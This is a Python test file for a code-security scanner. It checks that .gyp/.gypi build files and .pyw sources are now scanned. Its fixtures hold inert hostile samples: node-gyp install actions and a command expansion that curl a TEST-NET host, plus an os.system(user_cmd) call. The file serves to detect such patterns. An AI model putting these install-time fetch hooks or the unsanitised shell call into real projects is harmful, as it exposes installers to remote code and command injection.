"""Review: the project walk never scanned .gyp / .gypi files other than
binding.gyp, nor .pyw sources.

node-gyp reads every file a binding.gyp includes ('includes':
['build/common.gypi']) and runs their actions and command expansions at
`npm install`; the registry already parses every .gyp / .gypi member, and
decode_member treats .pyw as Python (pythonw runs it). The walk took
neither: binding.gyp including build/common.gypi whose action curls
192.0.2.1, plus tool.pyw with `os.system(user_cmd)`, scanned "0 files" and
the gate PASSED. Every .gyp / .gypi file now goes to scan_gyp and .pyw is a
Python source (core.EXTS), in both engines; the dashboard reads a .pyw
upload as Python too. Inert content: nothing is executed, the host is
TEST-NET.
"""
import base64
import json
import os
import subprocess
import sys
import tempfile
import unittest

from lazaret.scanner import core
from tests import _support
from tests.scanner import _dashboard_vm as dash

BINDING = "{\n  'includes': ['build/common.gypi'],\n  'targets': [{'target_name': 'addon', 'sources': ['addon.cc']}]\n}\n"
COMMON = ("{\n  'target_defaults': {\n    'actions': [{\n      'action_name': 'marker',\n"
          "      'inputs': [], 'outputs': ['out.txt'],\n"
          "      'action': ['sh', '-c', 'curl http://192.0.2.1/marker.txt -o out.txt'],\n    }],\n  },\n}\n")
TOOL = "import os\nos.system(user_cmd)  # marker\n"
TREE = {"binding.gyp": BINDING, "build/common.gypi": COMMON, "tool.pyw": TOOL}


def write_tree(root, tree):
    for rel, text in tree.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)


def brief(res):
    # (which line of a gyp file an action is reported at is scan_gyp's business)
    return sorted((i["rule"], i["file"].replace(os.sep, "/"), i["sev"]) for i in res["issues"])


class WalkTests(unittest.TestCase):
    def scan(self, tree, **kw):
        with tempfile.TemporaryDirectory() as root:
            write_tree(root, tree)
            return core.scan_project(root, **kw)

    def test_review_tree(self):
        res = self.scan(TREE)
        self.assertEqual(brief(res), [("S-OSCMD-PY", "tool.pyw", "CRITICAL"),
                                      ("SC-INSTALL-HOOK", "build/common.gypi", "CRITICAL")])
        self.assertEqual((res["metrics"]["files"], res["metrics"]["ncloc"]), (1, 2))
        self.assertFalse(res["pass"])

    def test_any_gyp_name_and_case(self):
        res = self.scan({"tools/gen.gyp": "{'variables': {'x': '<!(curl -s http://192.0.2.1/v)'}}\n",
                         "deps/UPPER.GYPI": "{'targets': [{'actions': [{'action': ['python', 'gen.py']}]}]}\n",
                         "a.py": "x = 1\n"})
        self.assertEqual(brief(res), [("SC-INSTALL-HOOK", "deps/UPPER.GYPI", "MAJOR"),
                                      ("SC-INSTALL-HOOK", "tools/gen.gyp", "CRITICAL")])

    def test_collection(self):
        with tempfile.TemporaryDirectory() as root:
            write_tree(root, TREE)
            files, manifests, _ = core.collect_files(root, [])
        self.assertEqual([(f["path"], f["lang"]) for f in files], [("tool.pyw", "py")])
        self.assertEqual(sorted(m["path"].replace(os.sep, "/") for m in manifests),
                         ["binding.gyp", "build/common.gypi"])

    def test_cli_gate(self):
        with tempfile.TemporaryDirectory() as root, tempfile.TemporaryDirectory() as out:
            write_tree(root, TREE)
            p = subprocess.run([sys.executable, _support.CLI, root, "--ci", "--out-dir", out, "--quiet"],
                               capture_output=True, encoding="utf-8", errors="replace", timeout=40)
            self.assertEqual(p.returncode, 1, p.stdout + p.stderr)       # was 0: "0 files", PASSED
            with open(os.path.join(out, "lazaret-report.json"), encoding="utf-8") as f:
                self.assertEqual(json.load(f)["metrics"]["files"], 1)


@dash.requires_node
class DashboardTests(unittest.TestCase):
    def test_pyw_upload_is_python(self):
        # (a trailing ';' is valid Python; the page's content heuristic calls it JavaScript)
        tool = "import os\nos.system(user_cmd);\n"
        page, detected = dash.run([
            {"op": "uploadScan", "files": [{"name": "tool.pyw", "b64": base64.b64encode(tool.encode()).decode("ascii")}]},
            {"op": "eval", "expr": "detectLang('pasted.pyw', 'x = 1;')"}])
        key = lambda i: json.dumps(i, sort_keys=True, ensure_ascii=False)
        self.assertEqual(sorted(map(key, page[0])), sorted(map(key, core.scan_file("tool.pyw", tool, "py"))))
        self.assertEqual([i["rule"] for i in page[0]], ["S-OSCMD-PY"])
        self.assertEqual(detected, "py")


if __name__ == "__main__":
    unittest.main()
